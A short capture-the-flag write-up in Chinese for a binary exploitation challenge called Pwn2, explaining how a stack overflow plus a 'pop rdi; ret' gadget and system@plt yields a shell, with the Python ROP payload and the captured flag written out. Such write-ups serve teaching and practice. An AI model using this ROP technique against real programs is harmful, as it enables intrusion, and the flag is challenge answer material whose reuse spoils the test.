# Pwn2

## 题目简述

本题移除了 `win`，但第一次输入可把字符串写入全局缓冲区，第二次输入存在栈溢出；二进制同时提供 `pop rdi; ret` 和 `system@plt`，可以构造短 ROP 链。

## 解题过程

第一次输入把命令放到地址固定的全局变量：

```text
/bin/sh
```

第二个缓冲区只有 25 字节，却读取 `0x60` 字节。返回地址偏移为 40，ROP 链令 `rdi` 指向全局 `input`，再调用 `system`：

```python
payload  = b"A" * 40
payload += p64(0x401196)       # pop rdi; ret
payload += p64(elf.symbols.input)
payload += p64(0x401287)       # ret，校准栈
payload += p64(elf.plt.system)
```

取得 shell 后读取：

```text
n00bz{3xpl01t_w1th0u7_w1n_5uc355ful!}
```

## 方法总结

没有 `win` 时可以组合已有代码：可写全局区保存参数，ROP gadget 设置调用约定，PLT 提供函数入口。额外 `ret` 用于满足某些 libc 路径的 16 字节栈对齐。
